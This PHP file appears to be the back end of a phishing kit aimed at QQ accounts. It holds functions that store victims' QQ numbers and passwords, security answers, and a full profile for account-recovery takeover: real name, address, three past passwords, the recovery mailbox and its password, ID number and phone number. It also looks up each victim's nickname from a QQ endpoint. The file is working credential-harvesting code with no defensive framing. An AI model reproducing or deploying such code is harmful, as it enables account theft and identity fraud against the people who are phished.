<?php

date_default_timezone_set('PRC');

function setMail($mail){
	file_put_contents("mail.dbk", json_encode($mail));
}

function getMail(){
	return file_get_contents("mail.dbk");
}

function setAdminPassword($password){
	file_put_contents("admin.dbk", json_encode($password));
}

function getAdminPassword(){
	return file_get_contents("admin.dbk");
}

function getAllQQ(){
	return file_get_contents("qqdata.dbk");
}

function writeQQ($qq,$pw){
	$origin=getAllQQ();
	$origin=json_decode($origin,true);
	if($origin==null){
		$origin=array();
		array_push($origin,array("qq"=>$qq,"password"=>$pw,"time"=>date("Y-m-d H:i:s",time())));
	}else{
		foreach ($origin as $key => $value) {
			$flag=0;
			if($value['qq']==$qq){
				$flag++;
				break;
			}
		}
	}
	if($flag<=0){
		array_push($origin,array("qq"=>$qq,"password"=>$pw,"time"=>date("Y-m-d H:i:s",time())));
	}
	file_put_contents("qqdata.dbk",json_encode($origin));
}

function writeSecurity($qq,$content){
	$o=getSecurity();
	$o=json_decode($o,true);
	$index=0;
	if($o==null){
		$o=array();
		array_push($o,array("qq"=>$qq,"content"=>$content));
	}else{
		foreach ($o as $key => $value) {
			$flag=0;
			if($value['qq']==$qq){
				$flag++;
				$index=$key;
				break;
			}
		}
	}
	if($flag<=0){
		array_push($o,array("qq"=>$qq,"content"=>$content));
	}else{
		$o[$index]['content']=$content;
	}
	file_put_contents("security.dbk",json_encode($o));
}

function getSecurity(){
	return file_get_contents("security.dbk");
}

function getQQNick($qq){
	$str = file_get_contents('http://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins='.$qq);
	$str=iconv("GB2312","UTF-8//IGNORE", $str);
	$pattern = '/portraitCallBack\((.*)\)/is';
	preg_match ($pattern,$str, $result );
	$nickname=json_decode($result[1],true);
	return $nickname[$qq][6];
}

function writeDetail($qq,$trueName,$addr,$anotherQQ,$password,$reciveType,$reciveMail,$reciveMailPassword,$historyPw1,$historyPw2,$historyPw3,$trueName1,$certificateType,$certificateNumber,$phoneNumber,$other){
	$detailList=getDetail();
	$detailList=json_decode($detailList,true);
	$index=0;
	$detailInfo="真实姓名:$trueName;详细地址:$addr;另一个QQ:$anotherQQ;密码:$password;结果接收方式:$reciveType;接收结果的邮箱:$reciveMail;接收结果的邮箱密码:$reciveMailPassword;历史密码1:$historyPw1;历史密码2:$historyPw2;历史密码3:$historyPw3;真实姓名2:$trueName1;身份证类型:$certificateType;身份证号码:$certificateNumber;手机号码:$phoneNumber;备注:$other";
	
	if($detailList==null){
		$detailList=array();
		array_push($detailList,array("qq"=>$qq,"detail"=>$detailInfo));
	}else{
		foreach ($detailList as $key => $value) {
			$flag=0;
			if($value['qq']==$qq){
				$flag++;
				$index=$key;
				break;
			}
		}
	}
	if($flag<=0){
		array_push($detailList,array("qq"=>$qq,"detail"=>$detailInfo));
	}else{
		$detailList[$index]['detail']=$detailInfo;
	}

	file_put_contents("detail.dbk",json_encode($detailList));
}

function getDetail(){
	return file_get_contents("detail.dbk");
}

?>